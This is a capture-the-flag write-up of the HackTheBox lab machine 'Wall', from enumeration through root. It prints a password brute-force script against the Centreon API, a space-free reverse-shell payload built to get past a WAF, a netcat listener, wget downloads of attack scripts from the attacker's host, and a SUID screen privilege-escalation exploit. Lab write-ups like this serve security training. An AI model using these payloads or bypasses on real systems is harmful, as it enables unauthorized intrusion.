# HackTheBox: Wall.
My write up for the recently retired HackTheBox machine: Wall!

Wall was a fairly easy machine, although it was a little frustrating.

The machine had a web application vulnerable to RCE, however it was (semi) protected by a WAF.

Root access involved a vulnerable SUID binary.

## In the beginning..
As usual, I run nMap:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Finding http on port 80 along with SSH on port 22.

### HTTP

Continuing with basic enumeration, I run dirb on the web app.

```
$ dirb http://10.10.10.157/
```
Discovering these pages:
* aa.php
* server_status
* monitoring

/monitoring being the most interesting page, as it was protected by basic http authentication.

After attempting to login with common credentials and bruteforcing to no avail. I looked to the forums - finding this interesting post by @argot:

  English teachers can be very good at monitoring their class. Often times, if you use the wrong verb, they wont let you go. If you use different VERBS, maybe they'll let you go or at the very least they'll be more talkative.

## Verbs?
Instead of GET, a POST request to /monitoring results in:
```
root@kali:~# curl -X POST "http://10.10.10.157/monitoring/" -d "username=u&password=p"
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>
<meta http-equiv="refresh" content="0; URL='/centreon'" />
```
A redirection to /centreon!

  [Centreon](https://github.com/centreon/centreon) is one of the most flexible and powerful monitoring softwares on the market; it is absolutely free and Open Souce.

Looking around on centreon [documentation](https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication), I found the login api was at:

  http://10.10.10.157/centreon/api/index.php?action=authenticate

### Bruteforcing script!
The documentation says the default username is admin.
So I wrote a super simple script to bruteforce login API using rockyou:

```
#!/bin/bash
cat rockyou.txt | while read line
do
	echo "password=$line";
	curl -X POST "http://10.10.10.157/centreon/api/index.php?action=authenticate" -d "username=admin&password=$line";
done

```
The password is found to be password1.

### Attempting to pop a shell

Some research yields this related CVE: 
https://github.com/mhaskar/CVE-2019-13024

However it dosen't work. Why?

## WAF Evasion
A Web Application Firewall is blocking my attempts. 

I tested the WAF by hand, finding it results in status 403 when either 'nc' or ' ' (space character) were present.

So to inject the command, these two could not be present.

## ${IFS}
After some time studying at mhaskar's script, I decided to exploit using the GUI route.

Instead of space, I used ${IFS} to escape the space char as well as a PHP exploit to bypass 'nc'.

* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [StackExchange]https://security.stackexchange.com/questions/198928/reverse-php-shell-disconnecting-when-netcat-listener

I used those to craft a payload that results in status 200, then put the payload into Commands > Misc and bound it to the poller.

Payload:
```
php${IFS}-r${IFS}'$s=fsockopen("10.10.14.***",1337);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'

```
I then navigated to the page that the mhaskar script is sending requests to, checked the box that says 'post command' and hit export while listening on netcat.

Netcat listener:
```
$ nc -lvp 1337
```
I got a shell!

## www-data

Now I have a restricted shell - I need to perfrom some privilege escalation.

I used LinEnum by running the following on my machine in the directory that LinEnum was in.

```
$ python -m SimpleHTTPServer 8000
```

And running the following on the target machine:

```
& wget 10.10.14.***:8000/LinEnum.sh
$ chmod +x LinEnum.sh
$ ./LinEnum.sh
```

## SUID PrivEsc

LinEnum shows me a vulnerable SUID:

```
-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
```
After a bit of research, I found an [exploit](https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html)!

With accompanying script: [screen2root](https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh).

In the same way as before I run the script on the target machine:
```
$ wget 10.10.14.***:8000/screenroot.sh
$ chmod +x screenroot.sh
$ ./screenroot.sh
```

## Rooted!

After running the script, I get root access!

## Thanks for reading :)

I've prepared writeups for Postman, Traverxec and Obscurity. Check back when they're retired for the writeups.
